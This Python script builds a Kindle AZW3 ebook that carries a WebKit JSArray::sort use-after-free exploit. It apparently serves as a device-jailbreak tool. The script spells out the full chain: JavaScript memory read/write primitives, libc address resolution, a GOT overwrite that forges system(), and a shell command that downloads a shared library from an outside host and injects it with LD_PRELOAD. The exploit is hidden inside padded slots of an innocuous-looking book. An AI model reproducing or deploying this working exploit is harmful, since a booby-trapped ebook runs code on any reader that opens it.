#!/usr/bin/env python3
# /// script
# requires-python = ">=3.9"
# dependencies = [
#     "pillow",
# ]
# ///

"""Build spidercat.azw3, a fixed-layout Kindle book that runs a shell command
when opened in the stock reader, via a JSArray::sort use-after-free in
webreader's WebKit. Reads offsets.json, page.xhtml, style.css, and cover.png
from this directory. Run: ``python3 build.py``.
"""

import io
import json
import os
import shutil
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)  # azwjs.py lives next to this script
from azwjs import Mobi, build_inline_tag, patch_fragments


# ---------------------------------------------------------------------------
# Tunables
# ---------------------------------------------------------------------------
TITLE = "SpiderCat"
AUTHOR = "sparky"
OUT = "spidercat.azw3"

# Fixed-layout canvas size. This is the PW6 (bellatrix4) screen; fixed-layout
# books are scaled to fit, so one value works on every reader.
RES_W, RES_H = 1264, 1680

# Bytes of "QQQ..." padding written into each exploit slot. The <script> payload
# is patched over this padding (length-preserving), so it must exceed the
# largest fragment (~3.2 KB). 3500 has been validated across all builds.
SLOT = 3500

# Book ASIN. None = generate a fresh random one each build, which defeats the
# Kindle scanner's SDR/cc.db cache and forces a re-index. Pin to a constant if
# you want a stable ASIN.
ASIN = None

# Address range that libc can be mapped at (ARM32 userspace). The candidate loop
# rejects any base outside this window.
LIBC_LO = 0x40000000
LIBC_HI = 0xC0000000

# The shell command executed on success. It is a single argv with NO spaces —
# the system() forge is triggered through a URL, so spaces are avoided.
# ``$IFS`` (the shell's "Internal Field Separator", a space) stands in for each
# space, and ``$IFS''`` (a variable name terminated by an empty quote pair) is
# required before a letter so ``$IFS`` does not absorb it (e.g. ``$IFShttps``
# would parse as the *variable* ``IFShttps``, which is empty).
CMD = ("curl$IFS-o$IFS/tmp/jb.so$IFS''https://kindlemodding.org/spidercat/jb.so"
       ";chmod$IFS+x$IFS/tmp/jb.so"
       ";lipc-set-prop$IFS''com.lab126.system$IFS''updateWaveform$IFS''LD_PRELOAD=/tmp/jb.so")


# ---------------------------------------------------------------------------
# Exploit JavaScript
#
# The JS below is the validated weapon. It is split into small fragments that
# are patched into separate padded slots in the KF8.
# ---------------------------------------------------------------------------

# Core helpers, shared by every fragment (fragments run in the same global
# scope). S() updates the on-page status line; f()/mk() convert between a double
# and its raw 64-bit bit pattern (lo/hi words); R() is the sort-UAF trigger;
# rd64()/wr64() are the arbitrary 8-byte read/write built on top of it.
HELPERS = r'''function S(x){try{console.log("U5:"+x)}catch(e){}try{document.getElementById("status").innerHTML=x}catch(e){}}
function f(d){if(d===0)return[0,0];if(d!==d)return[0,0x7ff80000];var s=d<0?1:0,a=Math.abs(d);if(a===Infinity)return[0,s?0xfff00000:0x7ff00000];var e=Math.floor(Math.log(a)/Math.LN2);while(a>=Math.pow(2,e+1))e++;while(a<Math.pow(2,e))e--;var b=e+1023,m;if(b<1){m=Math.round(a/Math.pow(2,-1074));b=0}else{m=Math.round((a/Math.pow(2,e)-1)*4503599627370496);if(m>=4503599627370496){m=0;b++}}var h=(s?0x80000000:0)|(b<<20)|Math.floor(m/4294967296),l=m%4294967296;return[l>>>0,h>>>0]}
function mk(lo,hi){var s=(hi>>>31)?-1:1,e=(hi>>>20)&0x7FF,m=(hi&0xFFFFF)*4294967296+(lo>>>0);if(e===0)return s*m*Math.pow(2,-1074);return s*(1+m/4503599627370496)*Math.pow(2,e-1023)}
function R(A){var o=null,arr=[{toString:function(){for(var i=0;i<0x200;i++)arr.push(0x41414141);o=(function(a,b){return arguments})(1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20);return"z0"}},A,A,A,A,A];arr.sort();return o}
var P=Math.pow(2,-1074),K=[];
function rd64(a){var r;try{r=R(a*P)}catch(e){return[-1,-1,"R"]}if(r===null)return[-1,-1,"N"];K.push(r);try{var w=f(r[2]);return[w[0],w[1],"ok"]}catch(e){return[-1,-1,"E"]}}
function wr64(a,lo,hi){var r;try{r=R(a*P)}catch(e){return"R"}if(r===null)return"N";K.push(r);try{r[2]=mk(lo,hi);return"ok"}catch(e){return"E"}}
var T=[];'''

# The payload fragment. It is a template: @@COMMAND@@ is replaced with CMD,
# @@LIBC_LO@@/@@LIBC_HI@@ with the libc ASLR window. The firmware table T is
# pushed by the generated fragments between HELPERS and this one.
#
# Table T layout (flat): for each firmware build, in order:
#   [e_entry, system, g_strcmp0_got, got_lo, got_hi, base, n,
#    (got_slot, libc_offset) x n]
# The runner walks T looking for an entry whose e_entry matches the running
# build, resolves libc via the candidates, and — only if none resolve — falls
# back to walking the dynamic linker's link_map by name. Then it forges
# g_strcmp0 -> system and fires the XHR. Status ends on "executing" (success) or
# an "abort:…"/"ERR:…" line.
RUNNER_TMPL = r'''
var LO=@@LIBC_LO@@,HI=@@LIBC_HI@@;
function rd32(a){var v=rd64(a);return v[2]==="ok"?(v[0]>>>0):0xffffffff;}
function find_lmhead(minc,glo,ghi){for(var a=(minc-4)>>>0;a>=glo;a-=4){var p=rd32(a);if(p===0xffffffff||p>=0xffff0000||p<ghi||(p&3)!==0)continue;if(rd32(p)!==0)continue;var ld=rd32((p+8)>>>0);if(ld<glo||ld>=ghi)continue;var dt=rd32(ld);if(dt===0xffffffff||dt>=0x40)continue;S("head=0x"+p.toString(16));return p;}S("no-head");return 0;}
function find_libc(head){var lm=head;for(var k=0;k<64;k++){var name=rd32((lm+4)>>>0);if(!(name===0xffffffff||name===0||name>=0xffff0000)){var v=rd64(name);if(v[2]==="ok"&&v[0]===0x62696c2f&&v[1]===0x62696c2f){var v2=rd64((name+8)>>>0);if(v2[2]==="ok"&&(v2[0]&0xff)===0x63){S("libc=0x"+rd32(lm).toString(16));return rd32(lm);}}}lm=rd32((lm+12)>>>0);if(lm===0){S("c1");return 0;}}S("c2");return 0;}
function run(){try{
S("alive");
var base=(rd64(0x10000)[0]===0x464c457f)?0x10000:0x8000;
var ee=rd64(base+0x18)[0];
S("ee=0x"+ee.toString(16));
var libc=0,p=0,sys,gg,glo,ghi,wb,n,i,v,b,minc;
while(p<T.length&&!libc){
 if(T[p]!==ee){p+=7+2*T[p+6];continue;}
 sys=T[p+1];gg=T[p+2];glo=T[p+3];ghi=T[p+4];wb=T[p+5];n=T[p+6];minc=T[p+7];
 for(i=0;i<n&&!libc;i++){v=rd64(T[p+7+2*i]);if(v[2]==="ok"){b=(v[0]-T[p+8+2*i])>>>0;if((b&0xFFF)===0&&b>LO&&b<HI)libc=b>>>0;}}
 p+=7+2*n;
}
if(!libc){S("linkmap");var h=find_lmhead(minc,glo,ghi);if(h){libc=find_libc(h);if(libc)S("lm-libc=0x"+libc.toString(16));}else{S("no-lmhead");}}
if(libc){var system=(libc+sys)>>>0;S("libc=0x"+libc.toString(16));var vc=rd64(gg);if(vc[2]!=="ok"){S("abort:g_read");return;}S("forge:"+wr64(gg,system,vc[1]));var x=new XMLHttpRequest();x.open("GET","http://127.0.0.1?;@@COMMAND@@",false);try{x.send(null);}catch(e){}S("executing");}
if(!libc)S("no-firm ee=0x"+ee.toString(16));
}catch(e){S("ERR:"+(e&&e.name?e.name:e))}}
run();'''


# ---------------------------------------------------------------------------
# Firmware table assembly
# ---------------------------------------------------------------------------

def load_db(path):
    """Load offsets.json (a dict keyed 'Model-version')."""
    return json.load(open(path))


def group_by_e_entry(db):
    """Group entries by e_entry (the build fingerprint). A single e_entry can be
    shared by several devices, which may still differ in libc offsets."""
    groups = {}
    for key, d in db.items():
        if "e_entry" in d and "system" in d:
            groups.setdefault(int(d["e_entry"], 16), []).append((key, d))
    return groups


def family_sig(d):
    """Signature of a "family": system offset + full candidate list. Two entries
    with the same signature need identical runtime constants."""
    return (d["system"], tuple((c[0], c[1]) for c in d["candidates"]))


def dedupe_families(entries):
    """Drop entries that are runtime-identical (same family signature)."""
    seen, out = set(), []
    for key, d in entries:
        s = family_sig(d)
        if s not in seen:
            seen.add(s)
            out.append((key, d))
    return out


def filter_family_unique(families):
    """Within one e_entry group, keep only candidates whose (got, offset) pair is
    unique to that family. A resolving candidate must unambiguously identify the
    family, otherwise a wrong family could false-resolve to a plausible base."""
    out = []
    for key, d in families:
        cands = [(c[0], c[1]) for c in d["candidates"]]
        kept = []
        for got, off in cands:
            unique = True
            for key2, d2 in families:
                if key2 == key:
                    continue
                if any(got == got2 and off == off2 for got2, off2 in d2["candidates"]):
                    unique = False
                    break
            if unique:
                kept.append((got, off))
        out.append((key, d, kept))
    return out


def build_table(groups):
    """Flatten every family into the flat T[] table the runner walks."""
    table, report = [], []
    for ee in sorted(groups):
        fams = filter_family_unique(dedupe_families(groups[ee]))
        fams.sort(key=lambda x: int(x[1]["system"], 16))
        for key, d, cands in fams:
            table.append(f"0x{ee:x}")
            table.append(d["system"])
            table.append(d["g_strcmp0_got"])
            table.append(d["webreader_got_lo"])
            table.append(d["webreader_got_hi"])
            table.append(d["webreader_base"])
            table.append(str(len(cands)))
            for got, off in cands:
                table.append(got)
                table.append(off)
            report.append((key, ee, len(cands)))
    return table, report


def chunk_table(table, max_bytes=3200):
    """Split the flat table into T.push(...) chunks, each small enough to fit a
    single padded slot (the whole table is far too large for one <script>)."""
    chunks, cur, cur_len = [], [], len("T.push()")
    for v in table:
        add = len(v) + 1
        if cur and cur_len + add > max_bytes:
            chunks.append(cur)
            cur, cur_len = [v], len("T.push()") + add
        else:
            cur.append(v)
            cur_len += add
    if cur:
        chunks.append(cur)
    return chunks


def generate_fragments(table):
    """Return the ordered list of JS fragment strings: HELPERS, one T.push chunk
    per table chunk, then the payload template (filled in)."""
    frags = [HELPERS]
    for ch in chunk_table(table):
        frags.append("T.push(" + ",".join(ch) + ");")
    frags.append(RUNNER_TMPL.replace("@@COMMAND@@", CMD)
                 .replace("@@LIBC_LO@@", hex(LIBC_LO))
                 .replace("@@LIBC_HI@@", hex(LIBC_HI)))
    return frags


# ---------------------------------------------------------------------------
# KF8 (MOBI/AZW3) assembly
# ---------------------------------------------------------------------------

def _replace_records(book_path, replacements):
    """Replace whole PDB records in place and rebuild the record table.

    MOBI is a PalmDB: a fixed header, a record-offset table, then the records.
    Swapping a record for one of a different size shifts every later offset, so
    the offset table must be recomputed. ``replacements`` maps record index to
    new bytes.
    """
    d = bytearray(open(book_path, "rb").read())
    n = struct.unpack(">H", d[76:78])[0]
    offs = [struct.unpack(">I", d[78 + i * 8:82 + i * 8])[0] for i in range(n)] + [len(d)]
    body_start = offs[0]

    rec_data, new_offs = {}, []
    pos = body_start
    for i in range(n):
        new_offs.append(pos)
        rec_data[i] = replacements.get(i, d[offs[i]:offs[i + 1]])
        pos += len(rec_data[i])

    out = bytearray()
    out += d[0:76]
    out += struct.pack(">H", n)
    for i in range(n):
        out += struct.pack(">I", new_offs[i])
        out += d[78 + i * 8 + 4:78 + i * 8 + 8]
    out += d[78 + n * 8:offs[0]]
    for i in range(n):
        out += rec_data[i]
    open(book_path, "wb").write(bytes(out))


def _patch_cover_and_thumbnail(book_path, cover_src):
    """Rewrite the cover (EXTH 201) and thumbnail (EXTH 202) records.

    kindlegen emits the cover as a small GIF. On 5.19.x the Kindle indexer
    builds the library thumbnail from this record, so we replace it with a
    full-resolution PNG cover and a 300x480 JPEG thumbnail. (Note: on <=5.18.x
    the indexer does not extract covers from USB-sideloaded AZW3 at all, so the
    thumbnail will not appear there regardless.)
    """
    try:
        from PIL import Image
    except ImportError:
        print("Pillow not installed; skipping cover/thumbnail replacement "
              "(pip install pillow to enable).", file=sys.stderr)
        return

    im = Image.open(cover_src).convert("RGB")

    cov = im.resize((1600, 2560), Image.LANCZOS)
    cb = io.BytesIO(); cov.save(cb, "PNG"); cover_png = cb.getvalue()

    th = im.resize((300, 480), Image.LANCZOS)
    tb = io.BytesIO(); th.save(tb, "JPEG", quality=90); thumb_jpeg = tb.getvalue()

    m = Mobi(book_path)
    cover_idx = m.firstres + int.from_bytes(m.exth.get(201, b"\x00\x00\x00\x00"), "big")
    thumb_idx = m.firstres + int.from_bytes(m.exth.get(202, b"\x00\x00\x00\x02"), "big")

    _replace_records(book_path, {cover_idx: cover_png, thumb_idx: thumb_jpeg})


def _rekey(src, dst, asin, title, author):
    """Re-key a built AZW3 with a fresh ASIN/title/unique-ID.

    The Kindle scanner caches a book's identity in the SDR/cc.db cache by ASIN
    and the PalmDB unique-ID seed. Re-keying both makes the scanner treat it as
    a new book and re-index it. Also stamps EXTH 501 (CDE type) as "PDOC" so the
    book is classed as a personal document.
    """
    d = bytearray(open(src, "rb").read())
    n = struct.unpack(">H", d[76:78])[0]
    offs = [struct.unpack(">I", d[78 + i * 8:82 + i * 8])[0] for i in range(n)] + [len(d)]

    # PalmDB unique-ID seed (offset 68); the next-record-list (72) is left alone.
    uid = 0
    for c in asin.encode():
        uid = (uid * 31 + c) & 0xFFFFFFFF
    struct.pack_into(">I", d, 68, uid)

    def exth(t, val):
        b = val.encode() if isinstance(val, str) else val
        return struct.pack(">II", t, 8 + len(b)) + b

    new = exth(113, asin) + exth(501, "PDOC") + exth(503, title) + exth(504, title)
    if author:
        new += exth(100, author)

    # Insert `new` at the end of the EXTH record list, replacing the old
    # padding with fresh 4-byte-aligned padding.
    r0 = bytearray(d[offs[0]:offs[1]])
    ex = r0.find(b"EXTH")
    assert ex >= 0, "no EXTH header in record 0"
    hdr_len = struct.unpack(">I", r0[ex + 4:ex + 8])[0]
    nrec = struct.unpack(">I", r0[ex + 8:ex + 12])[0]
    q = ex + 12
    for _ in range(nrec):
        q += struct.unpack(">I", r0[q + 4:q + 8])[0]
    # Count the records actually appended to `new` (fixes the nrec+4 off-by-one).
    n_new = 0
    p = 0
    while p + 8 <= len(new):
        p += struct.unpack(">I", new[p + 4:p + 8])[0]
        n_new += 1
    # Replace [q .. ex+hdr_len] (the old padding) with `new` + fresh padding that
    # keeps the whole EXTH chunk 4-byte aligned.
    new_chunk = bytearray(new)
    new_chunk += b"\x00" * (-((q - ex) + len(new)) % 4)
    r0[q:ex + hdr_len] = new_chunk
    struct.pack_into(">I", r0, ex + 4, (q - ex) + len(new_chunk))
    struct.pack_into(">I", r0, ex + 8, nrec + n_new)

    # Rebuild the PDB record table (record 0 grew).
    body_start = 78 + n * 8 + 2
    new_offs = [body_start]
    pos = body_start + len(r0)
    for i in range(1, n):
        new_offs.append(pos)
        pos += offs[i + 1] - offs[i]

    out = bytearray()
    out += d[0:76]
    out += struct.pack(">H", n)
    for i in range(n):
        out += struct.pack(">I", new_offs[i])
        out += d[78 + i * 8 + 4:78 + i * 8 + 8]
    out += b"\x00\x00"
    out += bytes(r0)
    for i in range(1, n):
        out += d[offs[i]:offs[i + 1]]

    open(dst, "wb").write(bytes(out))


def _assemble_kf8(frags, out_path, title, asin, author):
    """Build the fixed-layout KF8, patch the exploit fragments into its slots,
    re-key it, and (optionally) fix the cover. Returns nothing."""
    src = "/tmp/spidercat_book_src"
    shutil.rmtree(src, ignore_errors=True)
    for sub in ("html", "css", "xml", "images"):
        os.makedirs(os.path.join(src, sub), exist_ok=True)

    # Optional cover (library thumbnail). Auto-detect in this directory.
    cover_src = ""
    for name in ("cover.png", "cover.jpg", "cover.jpeg", "cover.gif"):
        p = os.path.join(HERE, name)
        if os.path.isfile(p):
            cover_src = p
            break
    cover_meta = cover_item = ""
    if cover_src:
        ext = os.path.splitext(cover_src)[1].lower()
        mime = {".jpg": "image/jpeg", ".jpeg": "image/jpeg",
                ".png": "image/png", ".gif": "image/gif"}.get(ext, "image/jpeg")
        cover_meta = '  <meta name="cover" content="cover-img"/>\n'
        cover_item = f'  <item id="cover-img" href="images/cover{ext}" media-type="{mime}"/>\n'
        shutil.copy(cover_src, os.path.join(src, "images", "cover" + ext))

    # Fixed-layout OPF. "fixed-layout" + "original-resolution" is what makes
    # webreader render it as a full-screen page with <script> execution, rather
    # than reflowable text (which does not run JavaScript).
    OPF = ('<?xml version="1.0" encoding="UTF-8"?>\n'
           '<package xmlns="http://www.idpf.org/2007/opf" unique-identifier="b" version="2.0">\n'
           ' <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">\n'
           f'  <dc:title>{title}</dc:title><dc:creator>{author}</dc:creator>'
           '<dc:language>en</dc:language><dc:identifier id="b">x</dc:identifier>\n'
           '  <meta name="fixed-layout" content="true"/>'
           f'<meta name="original-resolution" content="{RES_W}x{RES_H}"/>\n'
           '  <meta name="orientation-lock" content="portrait"/>\n'
           + cover_meta +
           ' </metadata>\n'
           ' <manifest>\n'
           + cover_item +
           '  <item id="page" href="html/page.xhtml" media-type="application/xhtml+xml"/>\n'
           '  <item id="css" href="css/style.css" media-type="text/css"/>\n'
           '  <item id="ncx" href="xml/toc.ncx" media-type="application/x-dtbncx+xml"/>\n'
           ' </manifest>\n'
           ' <spine toc="ncx"><itemref idref="page"/></spine>\n'
           '</package>\n')

    # One padded slot div per fragment. Each holds SLOT "Q" bytes; the fragment's
    # <script> is later patched over this padding (length-preserving), which is
    # how the exploit survives kindlegen's re-encoding of the XHTML.
    slots_html = "".join(
        f'<div id="S{i}" class="patch-slot">{"Q" * SLOT}</div>\n' for i in range(len(frags))
    )

    # Visible page (page.xhtml in this directory, or a minimal fallback).
    page_path = os.path.join(HERE, "page.xhtml")
    if os.path.isfile(page_path):
        xhtml = open(page_path).read()
    else:
        xhtml = (f'<html><body><h1>{title}</h1>'
                 '<div id="status">waiting</div></body></html>\n')
    xhtml = xhtml.replace("</body>", slots_html + "</body>") if "</body>" in xhtml else xhtml + slots_html

    css_path = os.path.join(HERE, "style.css")
    if os.path.isfile(css_path):
        css = open(css_path).read()
    else:
        css = (f"html,body{{width:{RES_W}px;height:{RES_H}px;margin:0;padding:0;"
               "background:#fff;color:#000;font-family:serif;}\n")

    NCX = ('<?xml version="1.0"?><ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">'
           '<head><meta name="dtb:uid" content="x"/><meta name="dtb:depth" content="1"/></head>'
           f'<docTitle><text>{title}</text></docTitle>'
           '<navMap><navPoint id="p1" playOrder="1"><navLabel><text>p</text></navLabel>'
           '<content src="../html/page.xhtml"/></navPoint></navMap></ncx>\n')

    open(os.path.join(src, "content.opf"), "w").write(OPF)
    open(os.path.join(src, "html/page.xhtml"), "w").write(xhtml)
    open(os.path.join(src, "css/style.css"), "w").write(css)
    open(os.path.join(src, "xml/toc.ncx"), "w").write(NCX)

    kg = shutil.which("kindlegen")
    if not kg:
        sys.exit("kindlegen not found on PATH — install Amazon's KF8 compiler")
    r = subprocess.run([kg, "-c0", "content.opf", "-o", "book.azw3"],
                       cwd=src, capture_output=True)
    book = os.path.join(src, "book.azw3")
    if not os.path.exists(book):
        sys.exit("kindlegen failed:\n" + r.stdout.decode("latin1", "replace")[-800:])

    # Patch each exploit fragment into its slot.
    m = Mobi(book)
    slots, _, _ = m.find_slots()
    data = bytearray(m.data)
    for i, frag in enumerate(frags):
        if i not in slots:
            sys.exit(f"slot {i} not found (have {sorted(slots)})")
        patch_fragments(m, data, slots[i], build_inline_tag(frag.encode("utf-8")))

    tmp = os.path.join(HERE, "_unrekeyed.azw3")
    open(tmp, "wb").write(bytes(data))
    _rekey(tmp, out_path, asin, title, author)
    os.unlink(tmp)
    if cover_src:
        _patch_cover_and_thumbnail(out_path, cover_src)


def main():
    db = load_db(os.path.join(HERE, "offsets.json"))
    table, report = build_table(group_by_e_entry(db))
    frags = generate_fragments(table)

    print(f"[*] {len(db)} firmware entries -> {len(report)} families -> "
          f"{len(frags)} JS fragments ({sum(len(f) for f in frags)} bytes)")
    for key, ee, n_cand in report:
        print(f"    {key:26s} e_entry=0x{ee:x}  {n_cand} candidates")

    asin = ASIN or ("B0SRT" + os.urandom(2).hex().upper())
    out_path = os.path.join(HERE, OUT)
    _assemble_kf8(frags, out_path, TITLE, asin, AUTHOR)
    print(f"[*] wrote {out_path} (ASIN {asin})")


if __name__ == "__main__":
    main()
